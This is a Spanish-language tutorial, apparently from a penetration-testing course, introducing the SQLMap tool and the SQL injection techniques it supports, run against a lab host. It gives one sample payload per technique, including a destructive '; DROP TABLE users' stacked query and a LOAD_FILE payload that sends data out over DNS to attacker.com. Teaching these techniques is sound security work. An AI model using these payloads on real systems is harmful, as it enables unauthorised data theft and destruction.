[SQLMap](https://github.com/sqlmapproject/sqlmap) es una herramienta gratuita y de código abierto para pruebas de penetración escrita en Python que automatiza el proceso de detectar y explotar vulnerabilidades de SQL injection (SQLi). SQLMap ha sido desarrollado continuamente desde 2006 y todavía se mantiene en la actualidad.

```python
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```

SQLMap viene con un motor de detección poderoso, numerosas características y una amplia gama de opciones y conmutadores para ajustar muchos aspectos de la herramienta, como:

| Target connection          | Injection detection | Fingerprinting                                         |
| -------------------------- | ------------------- | ------------------------------------------------------ |
| Enumeration                | Optimization        | Protection detection and bypass using "tamper" scripts |
| Database content retrieval | File system access  | Execution of the operating system (OS) commands        |

---

## SQLMap Installation

SQLMap está preinstalado en tu Pwnbox y la mayoría de los sistemas operativos enfocados en seguridad. SQLMap también se encuentra en muchas bibliotecas de distribuciones de Linux. Por ejemplo, en Debian se puede instalar con:

```bash
sudo apt install sqlmap
```

Si queremos instalar manualmente, podemos usar el siguiente comando en el terminal de Linux o en la línea de comandos de Windows:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

Después de eso, SQLMap se puede ejecutar con:

```bash
python sqlmap.py
```

---

## Supported Databases

SQLMap tiene el mayor soporte para DBMSes de cualquier otra herramienta de explotación SQL. SQLMap soporta completamente los siguientes DBMSes:

| MySQL         | Oracle      | PostgreSQL         | Microsoft SQL Server |
| ------------- | ----------- | ------------------ | -------------------- |
| SQLite        | IBM DB2     | Microsoft Access   | Firebird             |
| Sybase        | SAP MaxDB   | Informix           | MariaDB              |
| HSQLDB        | CockroachDB | TiDB               | MemSQL               |
| H2            | MonetDB     | Apache Derby       | Amazon Redshift      |
| Vertica       | Mckoi       | Presto             | Altibase             |
| MimerSQL      | CrateDB     | Greenplum          | Drizzle              |
| Apache Ignite | Cubrid      | InterSystems Cache | IRIS                 |
| eXtremeDB     | FrontBase   |                    |                      |

El equipo de SQLMap también trabaja para agregar y soportar nuevos DBMSes periódicamente.

---

## Supported SQL Injection Types

SQLMap es la única herramienta de pruebas de penetración que puede detectar y explotar adecuadamente todos los tipos conocidos de SQLi. Podemos ver los tipos de inyecciones SQL soportados por SQLMap con el comando `sqlmap -hh`:

```bash
sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

Los caracteres de técnicas `BEUSTQ` se refieren a lo siguiente:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

---

## Boolean-based blind SQL Injection

Ejemplo de `Boolean-based blind SQL Injection`:

```sql
AND 1=1
```

SQLMap explota las vulnerabilidades de `Boolean-based blind SQL Injection` a través de la diferenciación de `TRUE` de `FALSE` en los resultados de las consultas, recuperando efectivamente 1 byte de información por solicitud. La diferenciación se basa en comparar las respuestas del servidor para determinar si la consulta SQL devolvió `TRUE` o `FALSE`. Esto varía desde comparaciones imprecisas del contenido de la respuesta en bruto, códigos HTTP, títulos de páginas, texto filtrado y otros factores.

- Los resultados `TRUE` generalmente se basan en respuestas que no tienen diferencias o tienen diferencias marginales con la respuesta regular del servidor.
- Los resultados `FALSE` se basan en respuestas que tienen diferencias sustanciales con la respuesta regular del servidor.
- `Boolean-based blind SQL Injection` se considera el tipo más común de SQLi en aplicaciones web.

---

## Error-based SQL Injection

Ejemplo de `Error-based SQL Injection`:

```sql
AND GTID_SUBSET(@@version,0)
```

Si los errores del `database management system` (`DBMS`) se devuelven como parte de la respuesta del servidor para cualquier problema relacionado con la base de datos, entonces hay una probabilidad de que puedan usarse para transportar los resultados de las consultas solicitadas. En tales casos, se utilizan payloads especializados para el DBMS actual, dirigidos a las funciones que causan comportamientos incorrectos conocidos. SQLMap tiene la lista más completa de payloads relacionados y cubre `Error-based SQL Injection` para los siguientes DBMSes:

| MySQL                | PostgreSQL | Oracle  |
| -------------------- | ---------- | ------- |
| Microsoft SQL Server | Sybase     | Vertica |
| IBM DB2              | Firebird   | MonetDB |

`Error-based SQLi` se considera más rápido que todos los demás tipos, excepto el `UNION query-based`, porque puede recuperar una cantidad limitada (por ejemplo, 200 bytes) de datos llamados "chunks" a través de cada solicitud.

---

## UNION query-based SQL Injection

Ejemplo de `UNION query-based SQL Injection`:

```sql
UNION ALL SELECT 1,@@version,3
```

Con el uso de `UNION`, generalmente es posible extender la consulta original (vulnerable) con los resultados de las declaraciones inyectadas. De esta manera, si los resultados de la consulta original se renderizan como parte de la respuesta, el atacante puede obtener resultados adicionales de las declaraciones inyectadas dentro de la propia respuesta de la página. Este tipo de SQL injection se considera el más rápido, ya que, en el escenario ideal, el atacante podría obtener el contenido de toda la tabla de interés con una sola solicitud.

---

## Stacked queries

Ejemplo de `Stacked Queries`:

```sql
; DROP TABLE users
```

La acumulación de consultas SQL, también conocida como "piggy-backing", es la forma de inyectar declaraciones SQL adicionales después de la vulnerable. En caso de que haya un requisito para ejecutar declaraciones que no sean consultas (por ejemplo, `INSERT`, `UPDATE` o `DELETE`), la acumulación debe ser compatible con la plataforma vulnerable (por ejemplo, `Microsoft SQL Server` y `PostgreSQL` la soportan por defecto). SQLMap puede usar tales vulnerabilidades para ejecutar declaraciones no-query en características avanzadas (por ejemplo, ejecución de comandos del SO) y recuperación de datos de manera similar a los tipos de SQLi `time-based blind`.

---

## Time-based blind SQL Injection

Ejemplo de `Time-based blind SQL Injection`:

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

El principio de `Time-based blind SQL Injection` es similar al `Boolean-based blind SQL Injection`, pero aquí el tiempo de respuesta se utiliza como la fuente para la diferenciación entre `TRUE` o `FALSE`.

- La respuesta `TRUE` generalmente se caracteriza por la diferencia notable en el tiempo de respuesta en comparación con la respuesta regular del servidor.
- La respuesta `FALSE` debería resultar en un tiempo de respuesta indistinguible de los tiempos de respuesta regulares.

`Time-based blind SQL Injection` es considerablemente más lento que el `Boolean-based blind SQLi`, ya que las consultas que resultan en `TRUE` retrasarían la respuesta del servidor. Este tipo de SQLi se utiliza en casos donde el `Boolean-based blind SQL Injection` no es aplicable. Por ejemplo, en caso de que la declaración SQL vulnerable sea una no-query (por ejemplo, `INSERT`, `UPDATE` o `DELETE`), ejecutada como parte de la funcionalidad auxiliar sin ningún efecto en el proceso de renderizado de la página, se usa `time-based SQLi` por necesidad, ya que el

 `Boolean-based blind SQL Injection` no funcionaría en este caso.

---

## Inline queries

Ejemplo de `Inline Queries`:

```sql
SELECT (SELECT @@version) from
```

Este tipo de inyección inserta una consulta dentro de la consulta original. Este tipo de SQL injection es poco común, ya que necesita que la aplicación web vulnerable esté escrita de una cierta manera. Aún así, SQLMap soporta este tipo de SQLi también.

---

## Out-of-band SQL Injection

Ejemplo de `Out-of-band SQL Injection`:

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

Este se considera uno de los tipos más avanzados de SQLi, utilizado en casos donde todos los demás tipos no son compatibles con la aplicación web vulnerable o son demasiado lentos (por ejemplo, `time-based blind SQLi`). SQLMap soporta `out-of-band SQLi` a través de "DNS exfiltration", donde las consultas solicitadas se recuperan a través del tráfico DNS.

Ejecutando SQLMap en el servidor DNS para el dominio bajo control (por ejemplo, `.attacker.com`), SQLMap puede realizar el ataque forzando al servidor a solicitar subdominios inexistentes (por ejemplo, `foo.attacker.com`), donde `foo` sería la respuesta SQL que queremos recibir. SQLMap puede luego recopilar estas solicitudes DNS fallidas y recopilar la parte `foo` para formar la respuesta SQL completa.